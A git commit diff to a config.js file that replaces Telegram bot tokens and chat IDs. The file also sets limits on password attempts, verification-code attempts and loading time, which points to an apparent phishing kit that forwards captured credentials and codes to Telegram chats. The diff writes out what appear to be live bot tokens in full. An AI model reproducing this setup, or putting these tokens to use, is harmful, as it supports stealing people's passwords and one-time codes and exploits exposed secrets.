d1bc56caf850aeb423ce3f507a1497b468c468d2
luuhoangduong061998-source <luuhoangduong061998@gmail.com>
2025-10-30 08:54:31 +0700

    Change tokens and chat IDs in config.js
    Updated configuration tokens and chat IDs.

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
-    token: '7734824066:AAEIf8D6iHe3RdFBpzIQp7SyXybCzbJ13oU',
-    chat_id: '6178198460',
-    noti_token: '7734824066:AAEIf8D6iHe3RdFBpzIQp7SyXybCzbJ13oU',
-    noti_chat_id: '-4604634408',
+    token: '8206500455:AAFoiOr7fQSIOCWGe789a-txLND6awLLde4',
+    chat_id: '8206500455',
+    noti_token: '8206500455:AAFoiOr7fQSIOCWGe789a-txLND6awLLde4',
+    noti_chat_id: '-1003152513947',
     max_password_attempts: 2,
     max_code_attempts: 2,
     password_loading_time: 3,
